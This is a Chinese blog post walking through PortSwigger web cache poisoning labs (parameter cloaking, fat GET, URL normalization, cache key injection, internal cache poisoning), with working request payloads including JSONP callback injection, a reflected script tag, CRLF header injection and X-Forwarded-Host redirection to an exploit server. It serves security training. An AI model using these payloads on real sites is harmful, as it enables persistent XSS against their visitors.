+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211745269.png" title="image-20231021174523177" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211745269.png" alt="image-20231021174523177"></a></p>
+<p>扫到了参数隐藏</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211749891.png" title="image-20231021174955790" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211749891.png" alt="image-20231021174955790"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211755095.png" title="image-20231021175513997" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211755095.png" alt="image-20231021175513997"></a></p>
+<p>如何理解这里是存在隐藏参数？</p>
+<p>首先看使用utm_content参数去访问一个页面的响应</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211757157.png" title="image-20231021175710061" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211757157.png" alt="image-20231021175710061"></a></p>
+<p>在响应包里，有个Set-Cookie头，这个是后端返回来的值，且值为我们传进去的utm_content的值</p>
+<p>再来看看检测的结果</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211758051.png" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211758051.png"></a></p>
+<p>可以看到，后端返回的<code>Set-Cookie</code>的值不是<code>q</code>，而是<code>akzldka</code>。这个就是ruby on rails的一个特性，会将<code>;</code>当做分割符号，同时如果存在多个相同的参数名，最终会取最后一个参数的值。所以这里最终向后端传入的<code>utm_content</code>的值就为<code>akzldka</code>。最重要的是，<code>utm_content</code>还不是缓存键</p>
+<p>再来看响应包里有个<code>/js/geolocate.js?callback=setCountryCookie</code></p>
+<p>发现可以通过修改<code>callback</code>的值来修改返回的内容</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211802248.png" title="image-20231021180235144" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211802248.png" alt="image-20231021180235144"></a></p>
+<p>所以接下来，我们要做的就是，利用缓存器和后端的解析差异，进行缓存投毒，修改<code>/js/geolocate.js?callback=</code>返回的内容</p>
+<p>payload如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/js/geolocate.js?callback=setCountryCookie&amp;utm_content=1;callback=alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211805053.png" title="image-20231021180533961" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211805053.png" alt="image-20231021180533961"></a></p>
+<p>当再次访问<code>/js/geolocate.js?callback=setCountryCookie</code>时，就会命中缓存</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211806304.png" title="image-20231021180601211" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211806304.png" alt="image-20231021180601211"></a></p>
+<p>原理其实就是缓冲器看到的和后端看到的不一样，从而造成的隐藏参数缓存投毒。</p>
+<p>需要修改一下payload，否则弹不了窗</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/js/geolocate.js?callback=setCountryCookie&amp;utm_content=1aaa;callback=alert(1)%3bsetCountryCookie</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211822872.png" title="image-20231021182247781" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211822872.png" alt="image-20231021182247781"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211823389.png" title="image-20231021182324320" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211823389.png" alt="image-20231021182324320"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211823549.png" title="image-20231021182315460" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310211823549.png" alt="image-20231021182315460"></a></p>
+<h2 id="通过Fat-GET-请求造成-Web-缓存中毒"><a href="#通过Fat-GET-请求造成-Web-缓存中毒" class="headerlink" title="通过Fat GET 请求造成 Web 缓存中毒"></a>通过Fat GET 请求造成 Web 缓存中毒</h2><blockquote>
+<p>该实验室容易受到<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning">网络缓存中毒的</a>影响。它接受<code>GET</code>且具有body的请求，但不将body包含在缓存键中。用户经常使用 Chrome 访问该网站的主页。</p>
+<p><code>alert(1)</code>要解决该实验室问题，请使用在受害者浏览器中 执行的响应来毒害缓存。</p>
+</blockquote>
+<p>有个callback参数，可以设置响应包</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212015129.png" title="image-20231021201503019" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212015129.png" alt="image-20231021201503019"></a></p>
+<p>响应包可控</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212015410.png" title="image-20231021201519311" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212015410.png" alt="image-20231021201519311"></a></p>
+<p>同时他还接受body里的值，且优先级高于get查询参数里的</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212017199.png" title="image-20231021201728097" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212017199.png" alt="image-20231021201728097"></a></p>
+<p>再访问<code>/js/geolocate.js?callback=setCountryCookie</code>后，会命中缓存</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212017076.png" title="image-20231021201753983" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212017076.png" alt="image-20231021201753983"></a></p>
+<p>从而造成xss</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212018043.png" title="image-20231021201816939" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212018043.png" alt="image-20231021201816939"></a></p>
+<h2 id="URL-规范化"><a href="#URL-规范化" class="headerlink" title="URL 规范化"></a>URL 规范化</h2><blockquote>
+<p>此实验室包含一个 XSS 漏洞，由于浏览器 URL 编码，该漏洞无法直接利用。</p>
+<p>要解决该实验室问题，请利用缓存的规范化过程来利用此漏洞。<code>alert(1)</code>找到 XSS 漏洞并注入将在受害者浏览器中执行的有效负载。然后，将恶意 URL 传递给受害者。</p>
+</blockquote>
+<p>访问的路径会在响应包中有显示</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212101296.png" title="image-20231021210117198" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212101296.png" alt="image-20231021210117198"></a></p>
+<p>如果构造如下payload，就会造成xss</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/raaa&lt;p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212102283.png" title="image-20231021210230179" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212102283.png" alt="image-20231021210230179"></a></p>
+<p>show response in browers</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212103341.png" title="image-20231021210315254" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212103341.png" alt="image-20231021210315254"></a></p>
+<p>但是，如果我们直接访问这个url的话，浏览器会自动进行url编码，导致这个xss无法成功</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212104925.png" title="image-20231021210420837" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212104925.png" alt="image-20231021210420837"></a></p>
+<p>但是这里其实还是可以xss的，因为url编码是浏览器做的事情，缓存器将url编码前和url编码后的查询字符串看做是同一个缓存键，所以，即使浏览器会将其编码再访问，获得的响应还是url编码前的内容</p>
+<p>如</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212107480.png" title="image-20231021210735383" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212107480.png" alt="image-20231021210735383"></a></p>
+<p>编码后的</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212107090.png" title="image-20231021210748003" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212107090.png" alt="image-20231021210748003"></a></p>
+<p>这个时候再访问相同的链接，也可以造成xss</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212108458.png" title="image-20231021210843367" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310212108458.png" alt="image-20231021210843367"></a></p>
+<p>然后先投毒，再给受害者发送<code>http://0ad300140309374d8133937e001a0080.web-security-academy.net/raaa%3Cp%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/p%3E</code>即可成功解决lab</p>
+<h2 id="缓存密钥注入"><a href="#缓存密钥注入" class="headerlink" title="缓存密钥注入"></a>缓存密钥注入</h2><blockquote>
+<p>该实验室包含多个独立漏洞，包括缓存密钥注入。用户经常使用 Chrome 访问该网站的主页。</p>
+<p>要解决该实验室问题，请结合漏洞<code>alert(1)</code>在受害者的浏览器中执行。请注意，您需要使用<code>Pragma: x-get-cache-key</code>标头才能完成本实验。</p>
+</blockquote>
+<p>访问<code>/</code>会看到他会302跳转</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221050281.png" title="image-20231022105002131" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221050281.png" alt="image-20231022105002131"></a></p>
+<p>跳转之后他会再次302跳转，只是会在<code>?</code>前添加一个<code>/</code>，且会命中缓存</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221050993.png" title="image-20231022105033899" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221050993.png" alt="image-20231022105033899"></a></p>
+<p>同时会在页面显示，但是这里的页面是无缓存的。所以如果要通过影响响应包的内容，只有通过第二次跳转来控制</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221051805.png" title="image-20231022105153694" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221051805.png" alt="image-20231022105153694"></a></p>
+<p>而且可以知道的是，<code>?lang=en</code>是在缓存键里的。那么就需要找一个非缓存键的参数</p>
+<p>用param miner扫描一下，又是老熟人:<code>utm_content</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221054651.png" title="image-20231022105408556" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221054651.png" alt="image-20231022105408556"></a></p>
+<p>将其添加到<code>/login?lang=en</code>后面</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221055875.png" title="image-20231022105532770" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221055875.png" alt="image-20231022105532770"></a></p>
+<p>再次访问，可以命中缓存</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221055680.png" title="image-20231022105557587" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221055680.png" alt="image-20231022105557587"></a></p>
+<p>但是如果我想通过这种方式来进行xss的话，会有waf拦截</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221105340.png" title="image-20231022110548238" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221105340.png" alt="image-20231022110548238"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221105901.png" title="image-20231022110552816" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221105901.png" alt="image-20231022110552816"></a></p>
+<p>所以得换种方式了</p>
+<p>再看</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221106763.png" title="image-20231022110626659" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221106763.png" alt="image-20231022110626659"></a></p>
+<p>同时修改lang的值也会改变这里src的值</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221130926.png" title="image-20231022113037825" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221130926.png" alt="image-20231022113037825"></a></p>
+<p>如果将cors的值修改为1，那么就会使用origin的值</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221131644.png" title="image-20231022113148548" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221131644.png" alt="image-20231022113148548"></a></p>
+<p>而且从响应包里的<code>X-Cache-Key</code>可以得出存在缓存键注入</p>
+<p>即，访问<code>/js/localize.js?lang=enaa?&amp;cors=1$$origin=123</code>，会命中相同的缓存</p>
+<p>修改origin的值，利用CRLF修改响应包，来造成xss</p>
+<p>这里要注意控制$$的数量，才能成功命中缓存</p>
+<p>经过测试，查询里的两个<code>$</code>对应着origin里的四个<code>$</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin: 123%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221218211.png" title="image-20231022121809114" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221218211.png" alt="image-20231022121809114"></a></p>
+<p>再访问<code>/js/localize.js?lang=en?cors=1$$origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$</code>可以命中相同的缓存</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221218752.png" title="image-20231022121819664" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221218752.png" alt="image-20231022121819664"></a></p>
+<p>为了让cors的值为1,可以在后面加上<code>#</code>来阻隔后面固定添加的<code>cors=0</code></p>
+<p>利用这一点，来进行xss</p>
+<p>现在利用点弄清楚了，需要回到开头，对<code>/login?lang=en</code>进行缓存投毒。在前面我们知道，可以修改参数lang后面的值，来修改对这个js文件的引入</p>
+<p>所以只需要发送一下请求包，即可对<code>/login?lang=en</code>进行投毒</p>
+<p>需要进行一次url编码</p>
+<p>%23就是<code>#</code>是为了让页面自动添加的cors&#x3D;0失效</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /login?lang=en?utm_content=x%26cors=1$$origin=x%250d%250aContent-Length:%25208%250d%250a%250d%250aalert(1)$$%23</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221232571.png" title="image-20231022123228468" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221232571.png" alt="image-20231022123228468"></a></p>
+<p>所以攻击步骤就是，先发包对js文件进行投毒</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /js/localize.js?lang=en?utm_content=z&amp;cors=1 HTTP/2</span><br><span class="line">Host: 0a62005e04b2c01c82ddcef500520093.web-security-academy.net</span><br><span class="line">Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221220466.png" title="image-20231022122014374" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221220466.png" alt="image-20231022122014374"></a></p>
+<p>然后再发包对<code>/login?lang=en</code>进行投毒</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /login?lang=en?utm_content=x%26cors=1$$origin=x%250d%250aContent-Length:%25208%250d%250a%250d%250aalert(1)$$%23</span><br></pre></td></tr></table></figure>
+
+<p>再访问主页的时候，就会弹窗</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221235210.png" title="image-20231022123501100" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221235210.png" alt="image-20231022123501100"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221235247.png" title="image-20231022123517154" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221235247.png" alt="image-20231022123517154"></a></p>
+<h2 id="内部缓存中毒"><a href="#内部缓存中毒" class="headerlink" title="内部缓存中毒"></a>内部缓存中毒</h2><blockquote>
+<p>该实验室容易受到<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-poisoning">网络缓存中毒的</a>影响。它使用多层缓存。用户经常使用 Chrome 访问该网站的主页。</p>
+<p>要解决该实验室问题，请毒害内部缓存，以便主页<code>alert(document.cookie)</code>在受害者的浏览器中执行。</p>
+</blockquote>
+<p>添加<code>X-Forwarded-Host: exploit-0a0100df03f51a66804607ac011b004a.exploit-server.net</code>标头的时候，响应包里对静态资源文件的请求会发发生变化</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221640576.png" title="image-20231022163857478" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221640576.png" alt="image-20231022163857478"></a></p>
+<p>但是对<code>/js/geolocate.js?callback=loadCountry</code>的请求不会变</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221643521.png" title="image-20231022164305421" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221643521.png" alt="image-20231022164305421"></a></p>
+<p>多次发送，直到他内部缓存的此连接被exploit的url覆盖</p>
+<p>经过多次发送后，对<code>/js/geolocate.js?callback=loadCountry</code>的请求也被覆盖</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221646646.png" title="image-20231022164655552" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221646646.png" alt="image-20231022164655552"></a></p>
+<p>然后修改一下exploit服务器上的返回内容，进行xss</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221652633.png" title="image-20231022165246548" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221652633.png" alt="image-20231022165246548"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221753370.png" title="image-20231022175346277" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310221753370.png" alt="image-20231022175346277"></a></p>
+<p>如果一个靶机一直不行的话，就新开个靶机再这样尝试即可</p>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/'>
+                            缓存投毒
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/web%E6%BC%8F%E6%B4%9E/'>
+                            web漏洞
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
